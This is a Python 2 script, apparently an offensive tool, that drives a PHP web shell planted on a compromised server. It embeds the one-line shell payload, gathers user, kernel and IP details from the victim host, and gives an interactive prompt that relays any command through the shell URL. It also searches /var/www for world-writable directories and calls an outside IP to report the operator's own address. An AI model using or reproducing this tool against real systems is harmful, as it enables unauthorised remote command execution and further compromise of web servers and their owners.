#!/usr/bin/env python

'''
-*- coding: utf-8 -*-
Copyright 2012 Ahmed Shawky @lnxg33k <ahmed@isecur1ty.org>

Command controller for <?php system($_GET[parameter]); ?>

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.
'''

from sys import argv
from urllib2 import urlopen, quote, URLError, HTTPError
from subprocess import Popen
import readline

class Commander(object):
    def __init__(self, url=None):
        self.url = url
        self.source = None
        self.info = None
        self.cmd = 'whoami;id;uname -a;pwd;/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''.replace(' ','%20')

    # defining static methods
    @staticmethod
    def banner():
        return """\033[93m
\t\t __         ______   ______   .___  ___. .___  ___.      ___      .__   __.  _______
\t\t|  |       /      | /  __  \  |   \/   | |   \/   |     /   \     |  \ |  | |       \\
\t\t|  |      |  ,----'|  |  |  | |  \  /  | |  \  /  |    /  ^  \    |   \|  | |  .--.  |
\t\t|  |      |  |     |  |  |  | |  |\/|  | |  |\/|  |   /  /_\  \   |  . `  | |  |  |  |
\t\t|  |      |  `----.|  `--'  | |  |  |  | |  |  |  |  /  _____  \  |  |\   | |  '--'  |
\t\t|__|       \______| \______/  |__|  |__| |__|  |__| /__/     \__\ |__| \__| |_______/
\t\t--------------------------------------------------------------------------------------
        \033[0m"""

    def ServerInfo(self):
        try:
            self.source = source = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
            print Commander.banner()
        except HTTPError:
            print '\n[!] Invalid URL.'
            exit(1)
        try:
            local_ip = (urlopen('http://85.214.27.38/show_my_ip').readlines())[0].split(':')[1].strip()
        except URLError:
            local_ip = 'Unknown'
        available_commands = ['exit', 'clear', 'history', 'info', 'banner', 'writable']
        self.info = \
        '''
        %s
        \033[91mUser\033[0m     :  \033[92m%s\033[0m
        \033[91mID\033[0m       :  \033[92m%s\033[0m
        \033[91mKernel\033[0m   :  \033[92m%s\033[0m
        \033[91mCWD\033[0m      :  \033[92m%s\033[0m
        \033[91mHost IPs\033[0m :  \033[92m%s\033[0m
        \033[91mLocal IP\033[0m :  \033[92m%s\033[0m
        %s

        \033[97m[+] Available commands: %s.\033[0m
        \033[97m[+] Inserting\033[0m \033[91m!\033[0m \033[97mat the begining of the command will execute it on your box.\033[0m
        ''' % ('-'* int(len(source[2])+12), source[0], source[1], source[2], source[3], ', '.join(source[4:]), local_ip, '-'* int(len(source[2])+12), available_commands)
        print self.info

    def BackConnect(self):
        i = 1
        history = []
        while True:
            try:
                try:
                    command = raw_input('%s\033[91m@\033[0m\033[92m%s\033[0m:~\033[93m(%s)\033[0m-$ ' % (self.source[0], self.source[4], self.source[3])).replace(' ', '%20')
                except IndexError:
                    command = raw_input('icommand\033[91m@\033[0m\033[92mserver:$ ')
                history.append(quote(command))
                if command not in ['exit', 'quite', 'bye']:
                    if command == 'clear':
                        Popen('clear', shell=True).wait()
                    elif command == 'history':
                        x = 1
                        for command in history:
                            print '%2d %s' % (x, command)
                            x += 1
                    elif command.startswith('!'):
                        Popen(quote(command)[1:], shell=True).wait()
                    elif command == 'info':
                        print self.info
                    elif command == 'banner':
                        print Commander.banner()
                    elif command == 'writable':
                        self.cmd = quote("find /var/www/ -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print")
                        source = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
                        for y in source:
                            print y
                    else:
                        source = urlopen('%s%s' % (self.url, command)).read()
                        if source:
                            print source.rstrip()
                        else:
                            print '%s: command not found' % quote(command)
                else:
                    print '\n\n[+] Preformed %d commands on the server.\n[!] Connection closed ..' % i
                    exit(1)
            except KeyboardInterrupt:
                print '\n\n[+] Preformed %d commands on the server.\n[!] Connection closed ..' % i
                exit(1)
            i += 1

def main():
    if len(argv) != 2:
        print '\n[+] Usage : %s Shell_URL\n[!] Example: %s http://www.test.com/shell.php?cmd=' % ((argv[0], )*2)
        exit(1)

    else:
        execute = Commander(str(argv[1]))
        execute.ServerInfo()
        execute.BackConnect()

if __name__ == '__main__':
    main()
